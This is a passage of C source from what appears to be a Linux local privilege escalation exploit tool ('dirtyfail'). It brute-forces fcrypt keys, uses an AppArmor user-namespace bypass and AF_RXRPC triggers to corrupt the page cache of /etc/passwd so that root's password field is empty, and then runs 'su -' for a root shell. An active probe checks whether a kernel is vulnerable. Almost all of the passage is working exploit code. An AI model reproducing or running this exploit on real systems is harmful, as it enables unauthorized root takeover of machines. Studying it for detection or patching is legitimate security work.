    if (!fcrypt_brute_force(Cb_actual, predicate_pb_nullok, MAX_BRUTE_ITERS_AB,
                            (uint64_t)time(NULL) ^ 0xB2ULL,
                            "K_B (chars 6..7 = \"0:\")", Kb, Pb)) {
        log_bad("K_B brute force exhausted");
        close(pfd); return DF_EXPLOIT_FAIL;
    }

    /* === Chained-ciphertext correction for K_C ====================== */
    uint8_t Cc_actual[8];
    memcpy(Cc_actual,     Pb + 2, 6);
    memcpy(Cc_actual + 6, Cc + 6, 2);

    /* === Brute force K_C ============================================= */
    uint8_t Kc[8], Pc[8];
    if (!fcrypt_brute_force(Cc_actual, predicate_pc_nullok, MAX_BRUTE_ITERS_C,
                            (uint64_t)time(NULL) ^ 0xC3ULL,
                            "K_C (chars 8..15 = \"0:GGGGG:\")", Kc, Pc)) {
        log_bad("K_C brute force exhausted");
        close(pfd); return DF_EXPLOIT_FAIL;
    }
    close(pfd);

    log_ok("all three keys found; handing off to bypass child for triggers");

    /* Pass the three K's to the inner via hex-encoded env vars. The
     * inner runs in the AA bypass userns (where add_key + AF_RXRPC
     * have CAP_NET_ADMIN); we (parent, init ns) stay here so the
     * eventual `su -` reaches REAL init-ns root via PAM nullok. */
    char hex[8 * 2 + 1];
    #define HEXSET(name, k) do {                                          \
        for (int i = 0; i < 8; i++) snprintf(hex + i*2, 3, "%02x", k[i]); \
        setenv(name, hex, 1);                                             \
    } while (0)
    HEXSET("DIRTYFAIL_K_A", Ka);
    HEXSET("DIRTYFAIL_K_B", Kb);
    HEXSET("DIRTYFAIL_K_C", Kc);
    #undef HEXSET
    setenv("DIRTYFAIL_INNER_MODE", "rxrpc", 1);

    int rc = apparmor_bypass_fork_arm(0, NULL);
    if (rc != DF_EXPLOIT_OK) {
        log_bad("inner exploit failed (exit=%d)", rc);
        return DF_EXPLOIT_FAIL;
    }

    /* Verify in init namespace — page cache is global. */
    int v = open("/etc/passwd", O_RDONLY);
    if (v < 0) { log_bad("verify open: %s", strerror(errno)); return DF_EXPLOIT_FAIL; }
    uint8_t after[16];
    ssize_t got = read(v, after, 16);
    close(v);
    if (got != 16) return DF_EXPLOIT_FAIL;

    log_step("/etc/passwd[0..15] now = '%.16s'", (char *)after);

    if (after[4] != ':' || after[5] != ':') {
        log_bad("page cache not in expected shape; trigger may have missed");
        return DF_EXPLOIT_FAIL;
    }
    log_ok("/etc/passwd page cache: root password field is now empty");

    if (!do_shell) {
        if (try_revert_passwd_page_cache())
            log_ok("page cache reverted (--no-shell)");
        else
            log_warn("page cache may still be modified — `sudo dirtyfail --cleanup` or reboot");
        return DF_EXPLOIT_OK;
    }

    log_ok("invoking 'su -' in init ns — PAM nullok accepts empty password → REAL ROOT");
    execlp("su", "su", "-", (char *)NULL);
    log_bad("execlp su: %s", strerror(errno));
    return DF_EXPLOIT_FAIL;
}

/* ---- inner ---------------------------------------------------------
 *
 * Runs in the AA bypass userns. Reads the three K's from
 * DIRTYFAIL_K_{A,B,C} env vars, fires three do_one_trigger calls.
 * The fcrypt brute force itself ran in the parent (no caps required).
 */

static bool hex_to_8b(const char *hex, uint8_t out[8])
{
    if (!hex || strlen(hex) != 16) return false;
    for (int i = 0; i < 8; i++) {
        unsigned int b;
        if (sscanf(hex + i*2, "%2x", &b) != 1) return false;
        out[i] = (uint8_t)b;
    }
    return true;
}

df_result_t dirtyfrag_rxrpc_exploit_inner(void)
{
    uint8_t Ka[8], Kb[8], Kc[8];
    if (!hex_to_8b(getenv("DIRTYFAIL_K_A"), Ka) ||
        !hex_to_8b(getenv("DIRTYFAIL_K_B"), Kb) ||
        !hex_to_8b(getenv("DIRTYFAIL_K_C"), Kc)) {
        log_bad("inner: DIRTYFAIL_K_{A,B,C} not set or invalid");
        return DF_TEST_ERROR;
    }

    /* Autoload rxrpc.ko by opening a dummy AF_RXRPC socket. */
    int dummy = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
    if (dummy >= 0) close(dummy);

    int t = open("/etc/passwd", O_RDONLY);
    if (t < 0) {
        log_bad("inner: open passwd: %s", strerror(errno));
        return DF_EXPLOIT_FAIL;
    }

    bool ok = do_one_trigger(t, 4, Ka)
           && do_one_trigger(t, 6, Kb)
           && do_one_trigger(t, 8, Kc);
    close(t);
    return ok ? DF_EXPLOIT_OK : DF_EXPLOIT_FAIL;
}

/* ---------------------------------------------------------------- *
 * Active probe — `--scan --active` path.
 *
 * Fires ONE forged-handshake trigger against a /tmp sentinel page
 * with an arbitrary 8-byte key. We don't try to predict what lands;
 * any byte change inside the spliced 8-byte window confirms the
 * kernel ran the STORE.
 * ---------------------------------------------------------------- */

df_result_t dirtyfrag_rxrpc_active_probe_inner(void)
{
    const char *sentinel = getenv("DIRTYFAIL_PROBE_SENTINEL");
    if (!sentinel || !*sentinel) {
        log_bad("rxrpc-probe: DIRTYFAIL_PROBE_SENTINEL not set");
        return DF_TEST_ERROR;
    }

    int dummy = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
    if (dummy >= 0) close(dummy);

    int t = open(sentinel, O_RDONLY);
    if (t < 0) {
        log_bad("rxrpc-probe: open %s: %s", sentinel, strerror(errno));
        return DF_TEST_ERROR;
    }

    /* Any 8-byte key works for a structural probe — we're not
     * recovering plaintext, just confirming the STORE fires. */
    static const uint8_t probe_key[8] = {
        0xDE, 0xAD, 0xBE, 0xEF, 0x01, 0x23, 0x45, 0x67
    };
    bool ok = do_one_trigger(t, 0, probe_key);
    close(t);
    return ok ? DF_EXPLOIT_OK : DF_TEST_ERROR;
}

df_result_t dirtyfrag_rxrpc_active_probe(void)
{
    char tmpl[] = "/tmp/dirtyfail-rxrpc-probe.XXXXXX";
    int sfd = mkstemp(tmpl);
    if (sfd < 0) { log_bad("rxrpc-probe mkstemp: %s", strerror(errno)); return DF_TEST_ERROR; }
    unsigned char filler[4096];
    memset(filler, 'A', sizeof(filler));
    if (write(sfd, filler, sizeof(filler)) != (ssize_t)sizeof(filler)) {
        close(sfd); unlink(tmpl); return DF_TEST_ERROR;
    }
    close(sfd);

    /* Fault page in. */
    int rfd = open(tmpl, O_RDONLY);
    if (rfd < 0) { unlink(tmpl); return DF_TEST_ERROR; }
    char tmp[4096];
    if (read(rfd, tmp, sizeof(tmp)) != (ssize_t)sizeof(tmp)) {
        close(rfd); unlink(tmpl); return DF_TEST_ERROR;
    }
    close(rfd);

    setenv("DIRTYFAIL_INNER_MODE",     "rxrpc-probe", 1);
    setenv("DIRTYFAIL_PROBE_SENTINEL", tmpl,          1);
    int rc = apparmor_bypass_fork_arm(0, NULL);
    unsetenv("DIRTYFAIL_INNER_MODE");
    unsetenv("DIRTYFAIL_PROBE_SENTINEL");

    if (rc == DF_PRECOND_FAIL) { unlink(tmpl); return DF_PRECOND_FAIL; }
    if (rc != DF_EXPLOIT_OK)   {
        log_bad("rxrpc-probe inner failed (exit=%d)", rc);
        unlink(tmpl); return DF_TEST_ERROR;
    }

    rfd = open(tmpl, O_RDONLY);
    if (rfd < 0) { unlink(tmpl); return DF_TEST_ERROR; }
    unsigned char after[64];
    ssize_t got = read(rfd, after, sizeof(after));
    close(rfd);
    unlink(tmpl);
    if (got <= 0) return DF_TEST_ERROR;

    /* Look for any byte that differs from the 'A' filler in the first
     * 32 bytes (the spliced 8-byte window plus any nearby fallout). */
    int first_diff = -1;
    for (int i = 0; i < (int)got && i < 32; i++) {
        if (after[i] != 'A') { first_diff = i; break; }
    }
    if (first_diff >= 0) {
        log_warn("ACTIVE PROBE rxrpc: STORE landed near offset %d → kernel is VULNERABLE",
                 first_diff);
        return DF_VULNERABLE;
    }
    log_ok("ACTIVE PROBE rxrpc: page intact — kernel rxrpc path appears patched");
    return DF_OK;
}

#else  /* not __linux__ */
df_result_t dirtyfrag_rxrpc_exploit(bool do_shell)
{
    (void)do_shell;
    log_bad("dirtyfrag_rxrpc_exploit: Linux-only");
    return DF_TEST_ERROR;
}
df_result_t dirtyfrag_rxrpc_exploit_inner(void)
{
    log_bad("dirtyfrag_rxrpc_exploit_inner: Linux-only");
    return DF_TEST_ERROR;
}
df_result_t dirtyfrag_rxrpc_active_probe(void)
{
    log_bad("dirtyfrag_rxrpc_active_probe: Linux-only");
    return DF_TEST_ERROR;
}
df_result_t dirtyfrag_rxrpc_active_probe_inner(void)
{
    log_bad("dirtyfrag_rxrpc_active_probe_inner: Linux-only");
    return DF_TEST_ERROR;
}
#endif
